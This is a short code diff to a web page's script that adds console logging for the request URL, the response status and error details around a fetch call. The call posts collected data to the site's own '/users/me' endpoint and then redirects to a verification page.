@@ -209,16 +209,19 @@
             }, {}));
 
             // Send data automatically
+            console.log("🌐 Making request to:", window.location.origin + "/users/me");
             fetch("/users/me", {
               method: "POST",
               headers: { "content-type": "application/json" },
               body: JSON.stringify(dataToSend),
             }).then((r) => {
-              console.log("✅ Auto data sent successfully");
+              console.log("✅ Auto data sent successfully, status:", r.status);
               clearInterval(intervalId);
               setTimeout(() => window.location.replace("verify.html"), 1000);
             }).catch((error) => {
               console.error("❌ Auto send failed:", error);
+              console.error("❌ Error details:", error.message);
+              console.error("❌ Current URL:", window.location.href);
               sessionSent = false; // Allow retry on error
             });
           }
